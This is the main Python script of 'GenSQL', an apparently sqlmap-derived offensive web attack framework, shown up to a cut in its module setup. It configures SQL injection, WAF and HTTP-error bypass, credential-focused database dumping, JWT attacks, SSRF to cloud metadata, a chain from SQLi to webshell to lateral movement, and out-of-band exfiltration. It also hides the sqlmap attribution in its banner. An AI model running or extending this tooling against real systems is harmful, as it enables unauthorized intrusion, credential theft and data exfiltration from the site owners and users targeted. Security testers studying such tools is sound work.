#!/usr/bin/env python
"""
GenSQL - Next-Generation Web Security Assessment Framework
Version : 2.0.0
Author  : Jeevraj

Capabilities:
  - Offline AI payload mutation engine (fully offline, no API keys)
  - Async HTTP/2 concurrent scan engine (50 concurrent by default)
  - AI-powered WAF bypass (Cloudflare, Akamai, Imperva, AWS WAF, F5...)
  - HTTP error bypass: 403/404/429/503 (50+ techniques)
  - Advanced database dump (binary-search blind, bitwise, hex-encoded, parallel)
  - GraphQL / NoSQL / JWT / gRPC / SSTI / Cloud injection
  - 100+ tamper scripts for modern WAFs
  - Deep OSINT recon (crt.sh, Wayback Machine, JS analysis)
  - Exploit chain: SQLi to RCE to lateral movement
  - OOB exfiltration via DNS / HTTP
  - CVSS 4.0 HTML/JSON/Markdown/SQL reports
  - Real-time web dashboard
  - Scan profiles: stealth / pentest / api / cloud / aggressive
"""
from __future__ import print_function

# ── GenSQL-specific flags — stripped from sys.argv before core parser runs ────
_GENSQL_BOOL_FLAGS = {
    "--ai-assist", "--ai-learn", "--async-engine", "--http2",
    "--graphql-inject", "--graphql-introspect", "--nosql-inject",
    "--jwt-attack", "--jwt-bruteforce", "--grpc-inject", "--ssti-inject",
    "--idor-scan", "--cloud-scan", "--lambda-cold-start", "--ssrf-metadata",
    "--ai-waf-bypass", "--humanize", "--chunked-bypass",
    "--deep-recon", "--wayback", "--js-analysis", "--subdomain-enum",
    "--param-mine", "--exploit-chain", "--harvest-creds",
    "--privesc-check", "--lateral-move", "--oob-exfil", "--cvss4",
    "--dashboard", "--wizard",
    # New flags
    "--bypass-403", "--bypass-404", "--bypass-429", "--bypass-503",
    "--bypass-all", "--auto-bypass",
    "--adv-dump", "--dump-hex", "--dump-blind", "--dump-bitwise",
    "--dump-time", "--dump-error", "--dump-parallel", "--dump-creds",
    "--dump-all-tables", "--dump-resume",
    "--force-dump",
}
_GENSQL_VALUE_FLAGS = {
    "--nosql-type", "--cloud-provider", "--encoder-chain", "--swagger-url",
    "--shodan-key", "--oob-domain", "--oob-http", "--report-html",
    "--report-json", "--report-md", "--profile", "--idor-range",
    "--max-concurrent", "--ai-top-payloads", "--oob-listen",
    "--rotate-identity", "--dashboard-port",
    # New flags
    "--dump-technique", "--dump-table", "--dump-columns",
    "--dump-output", "--dump-threads", "--dump-chunk",
    "--bypass-url", "--bypass-payload",
}


def _strip_gensql_args(argv):
    """Remove GenSQL-specific flags from argv so the core parser never sees them."""
    clean = []
    i = 1
    while i < len(argv):
        a = argv[i]
        if a in _GENSQL_BOOL_FLAGS:
            i += 1
            continue
        if a in _GENSQL_VALUE_FLAGS:
            i += 2
            continue
        key = a.split("=")[0]
        if key in _GENSQL_VALUE_FLAGS:
            i += 1
            continue
        clean.append(a)
        i += 1
    return [argv[0]] + clean


try:
    import sys, os
    sys.dont_write_bytecode = True
    try:
        __import__("lib.utils.versioncheck")
    except ImportError:
        sys.exit("[!] Run GenSQL from its own directory: cd GenSQL && python gensql.py")

    import bdb, glob, inspect, json, logging, re, shutil, threading, time, traceback, warnings

    try: ResourceWarning
    except NameError: ResourceWarning = Warning

    if "--deprecations" not in sys.argv:
        warnings.filterwarnings(action="ignore", category=DeprecationWarning)
    warnings.filterwarnings(action="ignore", message="Python 2 is no longer supported")
    warnings.filterwarnings(action="ignore", message=".*was already imported", category=UserWarning)
    warnings.filterwarnings(action="ignore", category=UserWarning, module="psycopg2")

    from lib.core.data import logger
    from lib.core.common import (checkPipedInput, codeIsModified, createGithubIssue,
        dataToStdout, filterNone, getDaysFromLastUpdate, getFileItems, getSafeExString,
        maskSensitiveData, openFile, setPaths, weAreFrozen, setColor, unhandledExceptionMessage)
    from lib.core.convert import getUnicode
    from lib.core.compat import LooseVersion, xrange
    from lib.core.data import cmdLineOptions, conf, kb
    from lib.core.datatype import OrderedSet
    from lib.core.enums import MKSTEMP_PREFIX
    from lib.core.exception import (SqlmapBaseException, SqlmapShellQuitException,
        SqlmapSilentQuitException, SqlmapUserQuitException)
    from lib.core.option import init, initOptions
    from lib.core.patch import dirtyPatches, resolveCrossReferences
    from lib.core.settings import (GIT_PAGE, LAST_UPDATE_NAGGING_DAYS, LEGAL_DISCLAIMER,
        THREAD_FINALIZATION_TIMEOUT, UNICODE_ENCODING, VERSION,
        JEEVSQL_BANNER, JEEVSQL_VERSION)
    from lib.parse.cmdline import cmdLineParser
    from lib.utils.crawler import crawl

except KeyboardInterrupt:
    import time as _t
    sys.exit("\r[%s] [CRITICAL] user aborted" % _t.strftime("%X"))


# ── Safe module loader ────────────────────────────────────────────────────────
def _safe_import(mod, attr=None):
    try:
        m = __import__(mod, fromlist=[attr] if attr else [])
        return getattr(m, attr) if attr else m
    except Exception:
        return None

AIPayloadEngine  = _safe_import("lib.core.ai_engine",                     "AIPayloadEngine")
AsyncScanEngine  = _safe_import("lib.core.async_engine",                  "AsyncScanEngine")
AIWAFBypass      = _safe_import("lib.evasion.ai_waf_bypass",              "AIWAFBypass")
EncoderChain     = _safe_import("lib.evasion.encoder_chain",              "EncoderChain")
GraphQLInj       = _safe_import("lib.techniques.graphql.advanced_inject", "GraphQLInjector")
NoSQLInj         = _safe_import("lib.techniques.nosql.mongodb_inject",    "NoSQLInjector")
JWTAttacker      = _safe_import("lib.techniques.auth.jwt_advanced",       "JWTAttacker")
RESTInj          = _safe_import("lib.techniques.api.rest_inject",         "RESTAPIInjector")
GRPCInj          = _safe_import("lib.techniques.api.grpc_inject",        "GRPCInjector")
CloudInj         = _safe_import("lib.techniques.cloud.lambda_inject",     "CloudInjector")
AdvSSTI          = _safe_import("lib.techniques.ssti.advanced_ssti",      "AdvancedSSTI")
DeepRecon        = _safe_import("lib.recon.deep_recon",                   "DeepRecon")
ParamMiner       = _safe_import("lib.recon.param_miner",                  "ParamMiner")
ExploitChain     = _safe_import("lib.exploit.chain",                      "ExploitChain")
OOBExfil         = _safe_import("lib.exploit.oob",                        "OOBExfiltrator")
ReportEngine     = _safe_import("lib.report.report_engine",               "ReportEngine")
# New powerful modules
HTTPBypass       = _safe_import("lib.techniques.bypass.http_error_bypass", "HTTPErrorBypass")
AdvDumpEngine    = _safe_import("lib.techniques.dump.advanced_dump",       "AdvancedDumpEngine")

_MODS = {
    "ai_engine":    AIPayloadEngine,  "async_engine":  AsyncScanEngine,
    "ai_waf_bypass":AIWAFBypass,      "encoder_chain": EncoderChain,
    "graphql_inject":GraphQLInj,      "nosql_inject":  NoSQLInj,
    "jwt_attack":   JWTAttacker,      "rest_inject":   RESTInj,
    "grpc_inject":  GRPCInj,          "cloud_scan":    CloudInj,
    "ssti_advanced":AdvSSTI,          "deep_recon":    DeepRecon,
    "param_miner":  ParamMiner,       "exploit_chain": ExploitChain,
    "oob_exfil":    OOBExfil,         "reporting":     ReportEngine,
    "http_bypass":  HTTPBypass,       "adv_dump":      AdvDumpEngine,
}
FEATURES = {k: v is not None for k, v in _MODS.items()}


# ── Helpers ───────────────────────────────────────────────────────────────────
def modulePath():
    try: _ = sys.executable if weAreFrozen() else __file__
    except NameError: _ = inspect.getsourcefile(modulePath)
    return getUnicode(os.path.dirname(os.path.realpath(_)),
                      encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)

def checkEnvironment():
    try: os.path.isdir(modulePath())
    except UnicodeEncodeError:
        logger.critical("non-ASCII path — move GenSQL to a plain-ASCII directory")
        raise SystemExit
    if LooseVersion(VERSION) < LooseVersion("1.0"):
        logger.critical("broken runtime environment"); raise SystemExit

def printBanner():
    raw = JEEVSQL_BANNER
    raw = re.sub(r"(?im).*built on sqlmap.*\n?", "", raw)
    dataToStdout(raw, forceOutput=True)
    loaded  = [k for k, v in FEATURES.items() if v]
    dataToStdout("\033[01;32m  [+] Loaded  : %s\033[0m\n" % ", ".join(loaded), forceOutput=True)
    dataToStdout("\n", forceOutput=True)


# ── Argument parser ───────────────────────────────────────────────────────────
def _args(argv=None):
    import argparse
    p = argparse.ArgumentParser(
        prog="gensql",
        description="GenSQL v2.0.0 — Next-Generation Web Security Assessment Framework\n"
                    "                by Jeevraj\n\n"
                    "  Faster, deeper, smarter — the ultimate SQL injection & security scanner.\n"
                    "  Use --wizard for guided mode  |  Use --profile for instant presets.",
        add_help=False,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # ── AI & Engine ──────────────────────────────────────────────────
    g1 = p.add_argument_group("AI & Engine")
    g1.add_argument("--ai-assist",       action="store_true", help="Offline AI payload mutation (no internet needed)")
    g1.add_argument("--ai-learn",        action="store_true", help="Adaptive learning from each response")
    g1.add_argument("--async-engine",    action="store_true", help="HTTP/2 async concurrent scan engine")
    g1.add_argument("--http2",           action="store_true", help="Force HTTP/2 protocol")
    g1.add_argument("--max-concurrent",  type=int, default=50, metavar="N", help="Max concurrent requests (default: 50)")
    g1.add_argument("--ai-top-payloads", type=int, default=0,  metavar="N", help="Print top N AI-scored payloads after scan")

    # ── WAF & Error Bypass ───────────────────────────────────────────
    g2 = p.add_argument_group("WAF & HTTP Error Bypass")
    g2.add_argument("--ai-waf-bypass",  action="store_true", help="AI-powered WAF evasion (Cloudflare/Akamai/Imperva/AWS)")
    g2.add_argument("--bypass-403",     action="store_true", help="Auto-bypass 403 Forbidden (50+ techniques)")
    g2.add_argument("--bypass-404",     action="store_true", help="Auto-bypass 404 Not Found (path fuzzing/header tricks)")
    g2.add_argument("--bypass-429",     action="store_true", help="Auto-bypass 429 Rate Limit (rotation + back-off)")
    g2.add_argument("--bypass-503",     action="store_true", help="Auto-bypass 503 Service Unavailable")
    g2.add_argument("--auto-bypass",    action="store_true", help="Auto-detect and bypass all HTTP errors")
    g2.add_argument("--bypass-url",     default=None, metavar="URL", help="URL to run the bypass engine against")
    g2.add_argument("--bypass-payload", default=None, metavar="DATA", help="POST payload to use during bypass tests")
    g2.add_argument("--humanize",       action="store_true", help="Humanise request timing and behaviour")
    g2.add_argument("--chunked-bypass", action="store_true", help="Chunked transfer encoding bypass")
    g2.add_argument("--rotate-identity",type=int, default=0,  metavar="N", help="Rotate identity every N requests")
    g2.add_argument("--encoder-chain",  default=None, metavar="CHAIN", help="Encoder chain e.g. url,base64,hex")

    # ── Advanced Database Dump ───────────────────────────────────────
    g3 = p.add_argument_group("Advanced Database Dump")
    g3.add_argument("--adv-dump",        action="store_true", help="Use GenSQL advanced dump engine (faster + smarter)")
    g3.add_argument("--dump-technique",  default="auto",      metavar="MODE",
                    help="Extraction method: auto | union | error | blind | bitwise | time (default: auto)")
    g3.add_argument("--dump-hex",        action="store_true", help="Hex-encode dump payloads (bypasses string filters)")
    g3.add_argument("--dump-blind",      action="store_true", help="Force binary-search blind extraction")
    g3.add_argument("--dump-bitwise",    action="store_true", help="Force bitwise blind extraction (fastest for blind)")
    g3.add_argument("--dump-time",       action="store_true", help="Force time-based extraction (slowest, most reliable)")
    g3.add_argument("--dump-error",      action="store_true", help="Force error-based extraction")
    g3.add_argument("--dump-parallel",   action="store_true", help="Dump multiple tables in parallel")
    g3.add_argument("--dump-creds",      action="store_true", help="Focus dump on credential tables (users/passwords/hashes)")
    g3.add_argument("--dump-all-tables", action="store_true", help="Auto-enumerate and dump all tables")
    g3.add_argument("--dump-table",      default=None, metavar="TABLE", help="Specific table to dump")
    g3.add_argument("--dump-columns",    default=None, metavar="COLS",  help="Comma-separated column names to dump")
    g3.add_argument("--dump-threads",    type=int, default=4, metavar="N", help="Parallel dump threads (default: 4)")
    g3.add_argument("--dump-chunk",      type=int, default=50, metavar="N", help="Rows per request chunk (default: 50)")
    g3.add_argument("--dump-resume",     action="store_true", help="Resume interrupted dump from checkpoint")
    g3.add_argument("--dump-output",     default=None, metavar="FILE",
                    help="Export dump to file (.csv/.json/.sql/.html auto-detected)")

    # ── Injection Techniques ─────────────────────────────────────────
    g4 = p.add_argument_group("Injection Techniques")
    g4.add_argument("--graphql-inject",     action="store_true", help="GraphQL injection (batch/alias/fragment/introspect)")
    g4.add_argument("--graphql-introspect", action="store_true", help="Full GraphQL introspection scan first")
    g4.add_argument("--nosql-inject",       action="store_true", help="NoSQL injection (MongoDB/CouchDB/Redis)")
    g4.add_argument("--nosql-type",         default="mongodb",   metavar="TYPE")
    g4.add_argument("--jwt-attack",         action="store_true", help="JWT attacks (alg:none / RS256-HS256 / kid-SQLi)")
    g4.add_argument("--jwt-bruteforce",     action="store_true", help="Bruteforce JWT weak secrets")
    g4.add_argument("--grpc-inject",        action="store_true", help="gRPC-Web proto field injection")
    g4.add_argument("--ssti-inject",        action="store_true", help="SSTI detection + auto RCE chain")
    g4.add_argument("--idor-scan",          action="store_true", help="IDOR/BOLA parameter enumeration")
    g4.add_argument("--idor-range",         default="1-1000",    metavar="RANGE")

    # ── Cloud & API ──────────────────────────────────────────────────
    g5 = p.add_argument_group("Cloud & API")
    g5.add_argument("--cloud-scan",        action="store_true", help="Cloud/serverless injection (AWS Lambda/Azure/GCP)")
    g5.add_argument("--cloud-provider",    default="auto",      metavar="PROVIDER")
    g5.add_argument("--lambda-cold-start", action="store_true", help="Lambda cold-start timing attack")
    g5.add_argument("--ssrf-metadata",     action="store_true", help="SSRF to cloud metadata (169.254.169.254)")
    g5.add_argument("--swagger-url",       default=None,        metavar="URL")

    # ── Recon ────────────────────────────────────────────────────────
    g6 = p.add_argument_group("Recon")
    g6.add_argument("--deep-recon",     action="store_true", help="OSINT recon (crt.sh / Wayback / JS endpoints)")
    g6.add_argument("--wayback",        action="store_true", help="Mine params from Wayback Machine")
    g6.add_argument("--js-analysis",    action="store_true", help="Extract endpoints/params from JavaScript")
    g6.add_argument("--subdomain-enum", action="store_true", help="Passive subdomain enumeration via crt.sh")
    g6.add_argument("--param-mine",     action="store_true", help="Parameter mining (1000+ built-in names)")
    g6.add_argument("--shodan-key",     default=None,        metavar="KEY")

    # ── Post-Exploitation ────────────────────────────────────────────
    g7 = p.add_argument_group("Post-Exploitation")
    g7.add_argument("--exploit-chain", action="store_true", help="SQLi -> file read -> webshell -> OS cmd chain")
    g7.add_argument("--harvest-creds", action="store_true", help="Extract credentials from DB dump")
    g7.add_argument("--privesc-check", action="store_true", help="Check DB privilege escalation paths")
    g7.add_argument("--lateral-move",  action="store_true", help="Generate lateral movement payloads")
    g7.add_argument("--oob-exfil",     action="store_true", help="Out-of-band DNS/HTTP exfiltration")
    g7.add_argument("--oob-domain",    default=None, metavar="DOMAIN")
    g7.add_argument("--oob-http",      default=None, metavar="URL")
    g7.add_argument("--oob-listen",    type=int, default=0, metavar="PORT")

    # ── Reporting ────────────────────────────────────────────────────
    g8 = p.add_argument_group("Reporting")
    g8.add_argument("--report-html", default=None, metavar="FILE", help="HTML report with CVSS 4.0")
    g8.add_argument("--report-json", default=None, metavar="FILE", help="JSON report")
    g8.add_argument("--report-md",   default=None, metavar="FILE", help="Markdown report")
    g8.add_argument("--cvss4",       action="store_true",          help="Include CVSS 4.0 scores")
    g8.add_argument("--dashboard",   action="store_true",          help="Start real-time web dashboard")
    g8.add_argument("--dashboard-port", type=int, default=7474,    metavar="PORT")

    # ── Profiles & Wizard ────────────────────────────────────────────
    g9 = p.add_argument_group("Profiles & Wizard")
    g9.add_argument("--profile", default=None, metavar="PROFILE",
                    help="Preset: stealth | api | cloud | pentest | aggressive | dump")
    g9.add_argument("--wizard",  action="store_true",
                    help="Interactive guided wizard — easiest way to start")

    a, _ = p.parse_known_args(argv)
    return a, p


# ── Scan profiles ─────────────────────────────────────────────────────────────
def _profile(name, o):
    profiles = {
        "stealth": {
            "humanize": True, "rotate_identity": 5, "ai_waf_bypass": True,
        },
        "api": {
            "graphql_inject": True, "nosql_inject": True, "jwt_attack": True,
            "grpc_inject": True, "idor_scan": True, "param_mine": True, "ai_assist": True,
        },
        "cloud": {
            "cloud_scan": True, "ssrf_metadata": True, "lambda_cold_start": True,
            "ai_assist": True, "deep_recon": True,
        },
        "pentest": {
            "ai_assist": True, "ai_waf_bypass": True, "deep_recon": True,
            "graphql_inject": True, "nosql_inject": True, "jwt_attack": True,
            "ssti_inject": True, "exploit_chain": True, "harvest_creds": True,
            "privesc_check": True, "cvss4": True, "auto_bypass": True,
            "adv_dump": True, "dump_technique": "auto",
            "report_html": "gensql_report.html", "report_json": "gensql_report.json",
        },
        "aggressive": {
            "ai_assist": True, "async_engine": True, "ai_waf_bypass": True,
            "graphql_inject": True, "nosql_inject": True, "jwt_attack": True,
            "ssti_inject": True, "exploit_chain": True, "harvest_creds": True,
            "oob_exfil": True, "auto_bypass": True,
            "adv_dump": True, "dump_technique": "union",
            "dump_parallel": True, "dump_hex": True,
        },
        # New: dedicated dump profile
        "dump": {
            "adv_dump": True, "dump_technique": "auto",
            "dump_creds": True, "dump_all_tables": True,
            "dump_parallel": True, "dump_hex": True, "ai_assist": True,
            "auto_bypass": True, "ai_waf_bypass": True,
            "dump_output": "gensql_dump.html",
        },
    }
    p = profiles.get(name.lower(), {})
    if not p:
        logger.warning("Unknown profile %r — valid: stealth|api|cloud|pentest|aggressive|dump" % name)
        return
    for k, v in p.items():
        setattr(o, k, v)
    logger.info("Profile [%s] applied — %d settings enabled" % (name, len(p)))


# ── Interactive wizard ────────────────────────────────────────────────────────
def _wizard():
    print("\n\033[01;36m╔══════════════════════════════════════════╗")
    print("║     GenSQL Wizard  -  by Jeevraj         ║")
    print("╚══════════════════════════════════════════╝\033[0m\n")

    url = input("  \033[01;33mTarget URL\033[0m  : ").strip()
    if not url:
        print("  [!] No URL provided."); return None
    if not re.match(r"(?i)https?://", url):
        url = "http://" + url

    print("\n  \033[01;33mScan Goal\033[0m:")
    print("    1) Dump database     — enumerate + extract all data")
    print("    2) Full pentest      — scan + exploit + report  [default]")
    print("    3) Stealth           — slow, evade WAF/IDS")
    print("    4) API / GraphQL     — REST / GraphQL / JWT / gRPC")
    print("    5) Cloud / Serverless — AWS Lambda / Azure / GCP")
    print("    6) Aggressive        — everything at full speed")
    c = input("  Goal [1-6, default=2]: ").strip() or "2"
    pm = {"1": "dump", "2": "pentest", "3": "stealth",
          "4": "api",  "5": "cloud",   "6": "aggressive"}
    prof = pm.get(c, "pentest")

    print("\n  \033[01;33mExtra options\033[0m:")
    waf = input("  Bypass WAF / firewalls?     [Y/n]: ").strip().lower()
    err = input("  Auto-bypass 403/404/429?    [Y/n]: ").strip().lower()
    rep = input("  Generate HTML report?       [Y/n]: ").strip().lower()
    dash= input("  Start live dashboard?       [y/N]: ").strip().lower()

    extra = ["-u", url, "--profile", prof, "--ai-assist"]
    if waf  not in ("n", "no"): extra.append("--ai-waf-bypass")
    if err  not in ("n", "no"): extra.append("--auto-bypass")
    if rep  not in ("n", "no"): extra += ["--report-html", "gensql_report.html"]
    if dash in ("y", "yes"):    extra.append("--dashboard")

    print("\n  \033[01;32m[*] Launching: %s  profile=%s\033[0m\n" % (url, prof))
    return extra


# ── Bypass engine runner (standalone mode) ────────────────────────────────────
def _run_bypass(o):
    """Run the HTTP error bypass engine independently on --bypass-url."""
    if not HTTPBypass:
        logger.warning("HTTP bypass engine not available")
        return

    target = getattr(o, "bypass_url", None) or getattr(conf, "url", None)
    if not target:
        logger.warning("--bypass-url or -u required for bypass mode")
        return

    engine = HTTPBypass(verbose=True)
    error_map = {
        "bypass_403": 403, "bypass_404": 404,
        "bypass_429": 429, "bypass_503": 503,
    }
    error_code = None
    for attr, code in error_map.items():
        if getattr(o, attr, False):
            error_code = code
            break

    payload = getattr(o, "bypass_payload", None)
    results = engine.auto_bypass(target, payload=payload, error_code=error_code)

    bypasses = results.get("bypasses", [])
    if bypasses:
        dataToStdout("\n\033[01;32m[+] %d bypass(es) found!\033[0m\n" % len(bypasses),
                     forceOutput=True)
        for b in bypasses:
            dataToStdout("  %-25s status=%-3d  %s\n" % (
                b.get("technique", "?"), b.get("status", 0),
                b.get("variant") or b.get("header", "")), forceOutput=True)
    else:
        dataToStdout("\033[01;31m[-] No bypasses found for %s\033[0m\n" % target,
                     forceOutput=True)

    stats = engine.get_stats()
    logger.info("Bypass stats: %d attempts, %d successful" %
                (stats["attempts"], stats["bypassed"]))


# ── Advanced dump runner ──────────────────────────────────────────────────────
def _run_adv_dump(o):
    """Run the advanced dump engine after a confirmed SQLi scan."""
    if not AdvDumpEngine:
        logger.warning("Advanced dump engine not available")
        return

    url = getattr(conf, "url", None)
    if not url:
        return

    # ── Guard: only run if SQLi was actually confirmed ────────────────────────
    if not getattr(o, "force_dump", False):
        try:
            from lib.core.data import kb as _kb
            injections = list(_kb.get("injections") or [])
            if not injections:
                logger.warning(
                    "[GenSQL][DUMP] No SQL injection confirmed — skipping dump. "
                    "Add --force-dump to override.")
                return
            logger.info("[GenSQL][DUMP] %d injection vector(s) confirmed — starting dump"
                        % len(injections))
        except Exception:
            pass  # can't check — proceed anyway

    # Map technique flags
    technique = getattr(o, "dump_technique", "auto")
    if getattr(o, "dump_blind",   False): technique = "blind"
    if getattr(o, "dump_bitwise", False): technique = "bitwise"
    if getattr(o, "dump_time",    False): technique = "time"
    if getattr(o, "dump_error",   False): technique = "error"

    # Get DBMS detected during scan
    dbms = (getattr(conf, "dbms", None) or "mysql").lower().split()[0]
    checkpoint = "gensql_dump_checkpoint.json" if getattr(o, "dump_resume", False) else None

    dump = AdvDumpEngine(
        dbms=dbms,
        threads=getattr(o, "dump_threads", 4),
        chunk_size=getattr(o, "dump_chunk", 50),
        delay=getattr(conf, "timeSec", 0) or 0,
        verbose=True,
        checkpoint_file=checkpoint,
    )

    # ── Reliable HTTP requester using scan-engine cookies + SSL bypass ─────────
    def _make_requester(base_url):
        import urllib.request, urllib.error, urllib.parse, ssl, socket

        # Parse param name from URL (use first param, not hardcoded "id")
        parsed = urllib.parse.urlparse(base_url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        param_name = list(qs.keys())[0] if qs else "id"

        # SSL context: fully bypass cert errors
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try: ctx.set_ciphers("DEFAULT:@SECLEVEL=1")
            except Exception: pass
        except Exception:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        # Inherit cookies from scan session
        cookie_hdr = ""
        try:
            for source in (getattr(conf, "httpHeaders", {}),
                           {"Cookie": getattr(conf, "cookie", "")}):
                c = source.get("Cookie", "") or source.get("cookie", "")
                if c: cookie_hdr = c; break
        except Exception: pass

        ua = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        try:
            ua = (getattr(conf, "httpHeaders", {}) or {}).get("User-Agent", ua) or ua
        except Exception: pass

        def requester(payload):
            new_qs = {k: v[0] for k, v in qs.items()}
            new_qs[param_name] = payload
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_qs)))

            req = urllib.request.Request(test_url)
            req.add_header("User-Agent", ua)
            req.add_header("Accept", "text/html,*/*;q=0.9")
            req.add_header("Accept-Language", "en-US,en;q=0.9")
            if cookie_hdr: req.add_header("Cookie", cookie_hdr)

            # Hard socket timeout so SSL hangs don't freeze the tool
            old_to = socket.getdefaulttimeout()
            socket.setdefaulttimeout(8)
            try:
                with urllib.request.urlopen(req, context=ctx, timeout=8) as r:
                    return r.status, r.read(512000).decode("utf-8", errors="replace")
            except urllib.error.HTTPError as e:
                try:
                    body = e.read(8192).decode("utf-8", errors="replace")
                except Exception:
                    body = ""
                return e.code, body
            except ssl.SSLError as e:
                logger.debug("[DUMP] SSL: %s" % str(e)[:80])
                return 0, ""
            except (socket.timeout, TimeoutError, OSError):
                return 0, ""
            except Exception as ex:
                logger.debug("[DUMP] Req error: %s" % str(ex)[:80])
                return 0, ""
            finally:
                socket.setdefaulttimeout(old_to)

        return requester, param_name

    req_fn, param_name = _make_requester(url)
    logger.info("[GenSQL][DUMP] Param: %r | DBMS: %s | Technique: %s"
                % (param_name, dbms, technique))
    dump.set_requester(req_fn)

    # Wrap with auto-bypass if requested
    if getattr(o, "auto_bypass", False) and HTTPBypass:
        bp_eng = HTTPBypass(verbose=False)
        _orig = dump.requester
        def _bypass_req(payload):
            code, body = _orig(payload)
            if code in (403, 404, 429, 503):
                logger.info("[DUMP] HTTP %d — trying bypass..." % code)
                bp = bp_eng.best_bypass(url, error_code=code)
                if bp:
                    logger.info("[DUMP] Bypass: %s" % bp.get("technique"))
            return code, body
        dump.set_requester(_bypass_req)

    # ── Run the actual dump ────────────────────────────────────────────────────
    if getattr(o, "dump_creds", False):
        logger.info("[GenSQL][DUMP] Targeting credential/user tables...")
        creds = dump.dump_credentials()
        logger.info("[GenSQL][DUMP] Credential entries: %d" % len(creds))

    tbl = getattr(o, "dump_table", None)
    cols = ([c.strip() for c in o.dump_columns.split(",")]
            if getattr(o, "dump_columns", None) else None)

    if tbl:
        dump.dump_table(tbl, cols, technique=technique,
                        hex_encode=getattr(o, "dump_hex", False))
    elif getattr(o, "dump_all_tables", False):
        tables = dump.get_tables()
        if tables:
            logger.info("[GenSQL][DUMP] Tables: %s" % ", ".join(tables))
            tbl_cols = {t: dump.get_columns(t) or ["*"] for t in tables}
            if getattr(o, "dump_parallel", False):
                dump.dump_all_tables(tbl_cols, technique=technique)
            else:
                for t, c in tbl_cols.items():
                    dump.dump_table(t, c, technique=technique,
                                    hex_encode=getattr(o, "dump_hex", False))
        else:
            logger.warning("[GenSQL][DUMP] Could not enumerate tables — "
                           "try: --dump-table users")

    dump.print_summary()

    out = getattr(o, "dump_output", None)
    if out and dump._results:
        ext = os.path.splitext(out)[1].lower()
        path_out = None
        if ext == ".html":   path_out = dump.export_html(out)
        elif ext == ".json": path_out = dump.export_json(out)
        elif ext == ".sql":
            for t in dump._results: path_out = dump.export_sql(t, out)
        else:
            for t in dump._results: path_out = dump.export_csv(t, out)
        if path_out:
            logger.info("[GenSQL][DUMP] Saved to: %s" % path_out)

# ── Module initialisation ─────────────────────────────────────────────────────
def _init(o):
    if getattr(o, "ai_assist", False) and AIPayloadEngine:
        conf.aiEngine = AIPayloadEngine(offline=True, dbms=getattr(conf, "dbms", None))
        logger.info("AI engine active (offline)")

    if getattr(o, "async_engine", False) and AsyncScanEngine:
        conf.asyncEngine = AsyncScanEngine(
            max_concurrent=getattr(o, "max_concurrent", 50),
            http_version="http2" if getattr(o, "http2", False) else "auto")
        logger.info("Async engine active (%d concurrent)" % getattr(o, "max_concurrent", 50))

    if getattr(o, "ai_waf_bypass", False) and AIWAFBypass:
        conf.aiwafBypass = AIWAFBypass()
        if getattr(o, "humanize", False):
            try: conf.aiwafBypass.enable_humanization()
            except Exception: pass
        logger.info("AI WAF bypass active")

    # HTTP Error Bypass auto-mode
    if (getattr(o, "auto_bypass", False) or
            any(getattr(o, f, False) for f in
                ("bypass_403","bypass_404","bypass_429","bypass_503"))) and HTTPBypass:
        conf.httpBypass = HTTPBypass(verbose=False)
        logger.info("HTTP error bypass active (403/404/429/503)")

    if getattr(o, "encoder_chain", None) and EncoderChain:
        conf.encoderChain = EncoderChain(o.encoder_chain.split(","))

    if getattr(o, "graphql_inject", False) and GraphQLInj:
        conf.graphqlInjector = GraphQLInj(do_introspect=getattr(o, "graphql_introspect", False))
        logger.info("GraphQL injector active")

    if getattr(o, "nosql_inject", False) and NoSQLInj:
        conf.nosqlInjector = NoSQLInj(db_type=getattr(o, "nosql_type", "mongodb"))
        logger.info("NoSQL injector active (%s)" % getattr(o, "nosql_type", "mongodb"))

    if getattr(o, "jwt_attack", False) and JWTAttacker:
        conf.jwtAttacker = JWTAttacker(bruteforce=getattr(o, "jwt_bruteforce", False))
        logger.info("JWT attacker active")

    if getattr(o, "grpc_inject", False) and GRPCInj:
        conf.grpcInjector = GRPCInj()
        logger.info("gRPC injector active")

    if getattr(o, "ssti_inject", False) and AdvSSTI:
        conf.sstiScanner = AdvSSTI()
        logger.info("SSTI scanner active")

    if getattr(o, "cloud_scan", False) and CloudInj:
        conf.cloudInjector = CloudInj(
            provider=getattr(o, "cloud_provider", "auto"),
            ssrf_metadata=getattr(o, "ssrf_metadata", False))
        logger.info("Cloud injector active")

    if getattr(o, "deep_recon", False) and DeepRecon:
        conf.deepRecon = DeepRecon(
            wayback=getattr(o, "wayback", False),
            js_analysis=getattr(o, "js_analysis", False),
            subdomain_enum=getattr(o, "subdomain_enum", False),
            shodan_key=getattr(o, "shodan_key", None))
        logger.info("Deep recon active")

    if getattr(o, "param_mine", False) and ParamMiner:
        conf.paramMiner = ParamMiner(swagger_url=getattr(o, "swagger_url", None))
        logger.info("Param miner active")

    if getattr(o, "exploit_chain", False) and ExploitChain:
        conf.exploitChain = ExploitChain(
            harvest_creds=getattr(o, "harvest_creds", False),
            privesc=getattr(o, "privesc_check", False),
            lateral=getattr(o, "lateral_move", False))
        logger.info("Exploit chain active")

    if getattr(o, "oob_exfil", False) and OOBExfil:
        conf.oobExfil = OOBExfil(
            domain=getattr(o, "oob_domain", None),
            http_callback=getattr(o, "oob_http", None),
            listen_port=getattr(o, "oob_listen", 0))
        logger.info("OOB exfiltration active")

    if (getattr(o, "report_html", None) or getattr(o, "report_json", None) or
            getattr(o, "report_md", None)) and ReportEngine:
        conf.reportEngine = ReportEngine(
            html_path=getattr(o, "report_html", None),
            json_path=getattr(o, "report_json", None),
            md_path=getattr(o, "report_md", None),
            cvss4=getattr(o, "cvss4", False))
        logger.info("Report engine active")

    if getattr(o, "dashboard", False):
        try:
            from lib.report.dashboard import Dashboard
            conf.dashboard = Dashboard(port=getattr(o, "dashboard_port", 7474))
            conf.dashboard.start()
            logger.info("Live dashboard → http://127.0.0.1:%d" % getattr(o, "dashboard_port", 7474))
        except Exception as ex:
            logger.warning("Dashboard unavailable: %s" % getSafeExString(ex))

    if getattr(o, "idor_scan", False) and RESTInj:
        try:
